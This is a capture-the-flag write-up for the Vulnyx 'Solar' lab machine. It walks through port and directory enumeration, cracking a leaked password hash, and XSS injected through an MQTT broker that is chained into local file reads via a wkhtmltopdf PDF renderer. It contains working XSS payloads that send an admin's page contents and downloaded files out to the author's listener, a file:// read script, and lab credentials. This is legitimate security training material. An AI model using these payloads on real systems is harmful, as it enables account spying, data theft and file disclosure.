---
author: Lenam  
pubDatetime: 2024-10-23T15:22:00Z  
title: WriteUp Solar - Vulnyx  
slug: solar-writeup-vulnyx-en
featured: false  
draft: false  
ogImage: "../../assets/images/solar/OpenGraph.png"  
tags:  
  - writeup  
  - vulnyx
  - xss
  - rce
  - lfi
  - session-spying
  - password-cracking
  - cron
  - doas
  - mqtt
  - pdf-injection
  - gpg
  - nodejs
description:  
  Below is the process for exploiting the Vulnyx Solar CTF. This is a challenging machine that requires patience.
lang: en  
---

Below is the process for exploiting the Vulnyx Solar CTF. This is a challenging machine that requires patience. While using tools like BeeF might simplify things, this writeup describes a manual method to solve it.

I hope you find it useful.

![Solar ASCII Art](../../assets/images/solar/image.png)

## Table of Contents

## Enumeration

### nmap

The target IP in this writeup is `192.168.1.173`, although it might vary in the examples, as this writeup was completed at different times when a different IP was assigned.

```bash
$ nmap -p- -n -Pn 192.168.1.173 -o all_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 02:27 CEST
Nmap scan report for 192.168.1.173
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
```

```bash
$ nmap -p22,80,443 -sVC 192.168.1.173 -oN specific_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 02:28 CEST
Nmap scan report for solar.nyx (192.168.1.173)
Host is up (0.00032s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 00:31:c1:0a:8b:0f:c9:45:e7:2f:7f:06:0c:4f:cb:42 (ECDSA)
|_  256 6b:04:c5:5d:39:ed:b3:41:d0:23:2b:77:d1:53:d0:48 (ED25519)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Solar Energy Control Login
| ssl-cert: Subject: commonName=www.solar.nyx/organizationName=Solar/stateOrProvinceName=Madrid/countryName=ES
| Subject Alternative Name: DNS:www.solar.nyx, DNS:www.sunfriends.nyx
| Not valid before: 2024-10-10T00:03:30
|_Not valid after:  2034-10-08T00:03:30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

We add `www.solar.nyx` and `www.sunfriends.nyx` to `/etc/hosts`.

```bash
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.1.173   www.solar.nyx www.sunfriends.nyx
```

If we try to access port 80, we are redirected to `https://www.solar.nyx`, but we can see two websites with a self-signed SSL certificate on port 443.

**www.solar.nyx**

![www.solar.nyx](../../assets/images/solar/image-1.png)

**www.sunfriends.nyx**

![www.sunfriends.nyx](../../assets/images/solar/image-2.png)

### Fuzzing

**www.solar.nyx**

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.solar.nyx -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.solar.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 745]
/login.php            (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php?msg=Log-out.]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/records              (Status: 301) [Size: 318] [--> https://www.solar.nyx/records/]
/session.php          (Status: 200) [Size: 0]
```

**www.sunfriends.nyx**

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.sunfriends.nyx -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.sunfriends.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 284]
/index.php            (Status: 200) [Size: 11089]
/server.php           (Status: 200) [Size: 1523]
/commands             (Status: 301) [Size: 329] [--> https://www.sunfriends.nyx/commands/]
/.php                 (Status: 403) [Size: 284]
/server-status        (Status: 403) [Size: 284]
```

Given the message:

```text
The forum is temporarily unavailable due to maintenance on the server.
We apologize for the inconvenience.
```
We conduct fuzzing to see if we can find any database, backup, or file being used during the maintenance.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.sunfriends.nyx -x txt,db,sql,gz,sql.gz,sqlite,rar,tar,zip,gzip,gz2 -k

... or ...

$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt -u https://www.sunfriends.nyx -x txt,db,sql,gz,sql.gz,sqlite,rar,tar,zip,gzip,gz2 -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.sunfriends.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sql.gz,rar,tar,zip,txt,db,gz,gz2,sql,sqlite,gzip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/database.sql.gz      (Status: 200) [Size: 1147]
Progress: 4032 / 4044 (99.70%)
===============================================================
Finished
===============================================================
```
We found the file https://www.sunfriends.nyx/database.sql.gz, downloaded it, decompressed it, and found a database with the following user data.

## Cracking hash

In the database backup, we found:

```sql
INSERT INTO `users` VALUES
(1,'Robert24','66dc8ac996672de0cdeb294808d4cca21ba0bc856c365e90562565853febed0c','user'),
(2,'calvin','e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879','user'),
(3,'JulianAdm','bbca1b30190fddeead4e1a845ee063bec94499601aa5ee795da8917767bdcdde','admin'),
(4,'John20','38858f3066c9a6f3d8c6e54fbfcff204d5383f0721c32bc8ae46cf46a93e3694','user');
```

We managed to crack only the hash for user **calvin**; the rest of the passwords appear to be secure.

```bash
$ echo e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879 > hash-calvin
$ hashcat ./hash-calvin
$ hashcat -m 1400 hash-calvin /usr/share/wordlists/rockyou.txt
$ hashcat -m 1400 hash-calvin /usr/share/wordlists/rockyou.txt --show
e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879:emily
```

In a short time, we obtained the password `emily`, so we logged into the form at `www.solar.nyx` with the credentials `calvin:emily`.

## XSS through MQTT

We analyzed the code at https://www.solar.nyx/dashboard.php.

![www.solar.nyx/dashboard.php](../../assets/images/solar/image-3.png)

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solar Energy Dashboard</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style2.css">
</head>

<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>User Name</span><br>Role</div>
        <canvas id="energyChart" class="energy-chart"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel"
                class="energy-value solar">0 kWh</span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel"
                class="energy-value consumed">0 kWh</span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel"
                class="energy-value grid-positive">0 kWh</span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

    
    </script>
</body>

</html>
```
It appears there is an MQTT broker accessible via WebSockets on port 443 at the endpoint `wss://www.solar.nyx/wss/`. Additionally, the same code reveals the credentials needed to connect to the MQTT broker:

```javascript
...
        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });
...
```

We also observed that data is received from the `data` topic and displayed on the dashboard in real time. This data corresponds to solar energy production and electricity consumption for the community installation.

```javascript
...
        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });
...
```

We connected to the server using an MQTT client and subscribed to the `#` topic, allowing us to receive data from all topics accessible to the user. Any client supporting WebSocket connections can be used, but we opted for MQTTX for convenience, as it has a GUI and is available on various platforms.

https://mqttx.app/downloads
https://github.com/emqx/MQTTX

![MQTT user configuration](../../assets/images/solar/image-4.png)

We observed that the MQTT client starts receiving the same data shown on the dashboard.

![alt text](../../assets/images/solar/image-4-old.png)

If we publish data to the `data` topic, we can see it reflected in `dashboard.php`.

![alt text](../../assets/images/solar/image-5-old.png)

We sent a high consumption value and saw how the graph bars moved. The page code shows that we can perform an XSS (Cross-Site Scripting) attack, as it uses only `innerHTML` without sanitizing the `solarEnergy` and `consumedEnergy` properties of the sent JSON.

```javascript
...
            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;
...
```

We can send a JSON like the following to execute any JavaScript on the `dashboard.php` page in the client/browser.

```json
{
  "solarEnergy": "<img src=x onerror=eval(atob(\/[base64encodeJavascriptCode]\/.source)); />",
  "consumedEnergy": 15
}
```

The session cookie is configured as `HttpOnly`, `Secure`, and with the `SameSite` policy set to `Strict`. We did not find any server-side pages displaying headers (such as the typical `phpInfo();`). It would be challenging to steal another user's cookie, but we could try to see what they are viewing, as CSP headers are not configured.

According to conversations on the `www.sunfriends.nyx` forum, it is highly likely that the user `JulianAdm` is viewing the Dashboard.

We set up a server on port 80 using Python:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And we sent the following `JSON` using `MQTTX` to the `data` topic with our IP address:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?url='+encodeURIComponent(window.location.href)+'&code='+btoa(document.body.outerHTML);})();\"; />",
  "consumedEnergy": 15
}
```

We received at least two requests on our HTTP service on port 80, one from our own IP and another from the machine's IP.

```bash
192.168.1.168 - - [03/Sep/2024 00:18:34] "GET /?url=https%3A%2F%2Fwww.solar.nyx%2Fdashboard.php&code=PGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJkYXNoYm9hcmQiPgogICAgICAgIDxvYmpl ... ZW50LmdldEVsZW1lbnRCeUlkKCdzZW5kLXJlY29yZC1pZCcpLm9uY2xpY2sgPSBzZW5kcmVjb3JkOwogICAgCiAgICA8L3NjcmlwdD4KCgo8L2JvZHk+ HTTP/1.1" 200 -
```

If we decode the base64, we will obtain the following code:

```html
<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>JulianAdm</span><br>admin</div>
        <canvas id="energyChart" class="energy-chart" width="400" height="200" style="display: block; box-sizing: border-box; height: 200px; width: 400px;"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel" class="energy-value solar"><span class="energy-value solar"><img src="x" onerror="(async () => {location.href='http://192.168.1.116?url='+encodeURIComponent(window.location.href)+'&amp;code='+btoa(document.body.outerHTML);})();" ;=""> kWh</span></span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel" class="energy-value consumed"><span class="energy-value consumed">15 kWh</span></span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel" class="energy-value grid-positive"><span class="energy-value grid-positive">NaN kWh</span></span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
                    <a href="/records/" class="logout-link">Records</a>
            <a href="#" class="logout-link" id="send-record-id">Send record</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "JulianAdm";
        let userRole = "admin";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

            // Show message
            function showMessage(msg) {
                const mensajeDiv = document.createElement('div');
                mensajeDiv.classList.add("temp-message")
                mensajeDiv.textContent = msg;
                document.body.appendChild(mensajeDiv);
                setTimeout(() => {
                    mensajeDiv.remove();
                }, 3000);
            }

            // Function to send the record 
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
    
    </script>


</body>
```
We can observe several differences in this code.

The page belongs to the user `JulianAdm`, whom we saw in the database and in the forum, but whose password we couldn't crack. Furthermore, this user has the `admin` role.

```javascript
...
        let userName = "JulianAdm";
        let userRole = "admin";
...
```

We obtain different credentials to connect to the MQTT service: `admin:tJH8HvwVwC57BR6CEyg5`. We use them to connect with the MQTT client.

```javascript
...
        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });
...
```

An interesting aspect is a function that seems to publish information to the `record` topic.

```javascript
...
            // Function to send the record 
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';

                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
...
```

This function creates a base64 image of the bar chart and, along with other data, sends it as a JSON to the `record` topic when the user clicks the `#send-record-id` button.

We also found another accessible path via a link: `/records/`. This path is not accessible to the `calvin` user, as he doesn't have the admin role.

We subscribed to all topics (`#`) using the credentials `admin:tJH8HvwVwC57BR6CEyg5`, and sent the following JSON to the `data` topic:

```json
{
  "solarEnergy": "<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />",
  "consumedEnergy": 15
}
```

We received the following JSON in the `record` topic:

```json
{"time":"2024-09-02T22:43:52.187Z","user":{"name":"JulianAdm","role":"admin"},"solar":"<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />","consumed":15,"grid":null,"chart":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAADICAYAAADGFbfiAAAgAElEQVR4Xu2dC3QV1b3GgYQYoAUSsMqjRVp5WAsWHwgVV6Mi2tt7aanGFwYDiAnPolXx ... BIgf8D+epLMhrp9ocAAAAASUVORK5CYII="}
```

The messages sent to the `data` topic with the XSS are deleted when new data is received every 2 seconds.

We tried publishing data to the `record` topic using the `admin` user of the MQTT service and had no issues doing so. Thus, we attempted to insert another XSS into the `chart` parameter of the JSON, assuming it would be embedded in the `src` attribute of an HTML `<img>` tag.

```json
{
  "time": "2024-09-02T23:25:15.855Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 211,
  "consumed": 168,
  "grid": -43,
  "chart": "\"><h1>XSS</h1></"
}
```
On the other hand, we attempted to access the page hosted at `/records/`. It seems related to this new topic. We restarted our HTTP service on port 80 on our machine:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

and sent the following JSON to the `data` topic:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => { location.href='http://192.168.1.116/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />",
  "consumedEnergy": 15
}
```

We received the following request on our HTTP service:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 01:32:57] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+TGlzdCBvZiBTb2xhciBFbmVyZ3kgRGF0YTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdHlsZS5jc3MiPgogICAgPGxpbmsgcmVsPSJ ... RG93bmxvYWQgUERGPC9hPgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgPGEgaHJlZj0iLi4vZGFzaGJvYXJkLnBocCIgY2xhc3M9ImxvZ291dC1saW5rIj4mbHQ7IEJhY2s8L2E+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 200 -
```

We decoded the base64 and found the following code from the `/records/` page:

```html
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
                            <tr>
                    <td>2024-09-02T23:04:27.035Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A04%3A27.035Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:09:07.758Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A09%3A07.758Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                ...

                            <tr>
                    <td>2024-09-02T23:29:26.645Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A29%3A26.645Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                    </table>
        <a href="../dashboard.php" class="logout-link">&lt; Back</a>
    </div>
</body>
</html>
```

We obtained a list of records in PDF format for download. There will never be more than 10 records, and for each message sent to the `record` topic, a downloadable PDF will appear in this list.

## XSS in PDF to LFI via MQTT

We downloaded some of these files using the same technique. We continued to listen with our HTTP service and sent the following JSON to the `data` topic, inserting the PDF file download URLs.

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-02T23%3A29%3A26.645Z.json')).arrayBuffer())));})();\" />",
  "consumedEnergy": 15
}
```

This time, we saved the base64 output in a file called `base64pdf1.txt`, for example.

```bash
cat base64pdf1.txt | base64 -d > document.pdf
```

If we view the document, we can see the XSS injection we sent.

![PDF XSS](../../assets/images/solar/image-6.png)

```bash
─$ exiftool document.pdf     
ExifTool Version Number         : 12.76
File Name                       : document.pdf
Directory                       : .
File Size                       : 20 kB
File Modification Date/Time     : 2024:09:03 01:46:09+02:00
File Access Date/Time           : 2024:09:03 01:46:19+02:00
File Inode Change Date/Time     : 2024:09:03 01:46:09+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Solar Energy Data
Creator                         : wkhtmltopdf 0.12.6.1
Producer                        : Qt 4.8.7
Create Date                     : 2024:09:02 19:43:43-04:00
Page Count                      : 1
Page Mode                       : UseOutlines
```

We can observe that these documents are created with `wkhtmltopdf 0.12.6.1`, which has the CVE `CVE-2022-35583`, but this won't be the case here.

We attempted an LFI, but we couldn't access the `/etc/passwd` file, although we succeeded with some PHP files from the web services.

### Step 1

We sent the following `JSON` to the `record` topic using the MQTT client with the `admin:tJH8HvwVwC57BR6CEyg5` user to attempt reading the `/var/www/solar.nyx/records/index.php` file from the server:

```json
{
  "time": "2024-07-13T00:07:36.621Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 232,
  "consumed": 223,
  "grid": -9,
  "chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
}
```

We can modify the variable `p='/var/www/solar.nyx/records/index.php'` to select other files.

We verified that the payload was correctly sent to the `record` topic from the MQTT client.

### Step 2

We retrieved the list of recent `/records/` on our HTTP service by sending the following JSON to the `data` topic:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => { location.href='http://192.168.1.116/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />",
  "consumedEnergy": 15
}
```

We decoded the base64 from the received `data` parameter:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 02:04:35] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU ... gICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgPGEgaHJlZj0iLi4vZGFzaGJvYXJkLnBocCIgY2xhc3M9ImxvZ291dC1saW5rIj4mbHQ7IEJhY2s8L2E+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 200 -
```

We obtained the client's HTML code and looked for the latest PDF link.

```html
<td>
    <td>2024-09-03T00:22:27.568Z</td>
    <td>
        <a href="?download=true&file=2024-09-03T00%3A22%3A27.568Z.json" class="download-btn">Download PDF</a>
    </td>
</td>
```

### Step 3

We sent the following JSON to the `data` topic to retrieve the PDF file from the obtained URL on our HTTP service. In our case, `/records/?download=true&file=2024-09-03T00%3A22%3A27.568Z.json`.

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-03T00%3A22%3A27.568Z.json')).arrayBuffer())));})();\" />",
  "consumedEnergy": 15
}
```

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 02:10:55] "GET /?data=JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AFMAbwBsAGEAcgAgAEUAbgBlAHIAZwB5ACAA ... dGFydHhyZWYKMTk0MzEKJSVFT0YK HTTP/1.1" 200 -
```

### Step 4

We save the base64 code of the PDF in a file and convert it to PDF.

```bash
$ head -c 100 base64pdf3.txt
JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AFMAbwBsAGEAcgAgAEUAbgBlAHIAZwB5ACAARABhAHQAYSkKL0NyZWF0b3Ig               
$ cat base64pdf3.txt | base64 -d > document3.pdf
```

We open it and obtain another base64 code, this time from the PHP file loaded locally by the server.

![alt text](../../assets/images/solar/image-7.png)

### Step 5

We decode the base64 from the PDF and obtain the following PHP code from the `/var/www/solar.nyx/records/index.php` file on the server.

```php
<?php
include("../session.php");

if (!isset($_SESSION['username']) || empty($_SESSION['username']) || $_SESSION['role'] != 'admin') {
    header("Location: /index.php");
    exit();
}
...
```

In the execution of `wkhtmltopdf`, we can observe that we will only be able to read server files within the `/var/www/` path.

```php
...
 $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
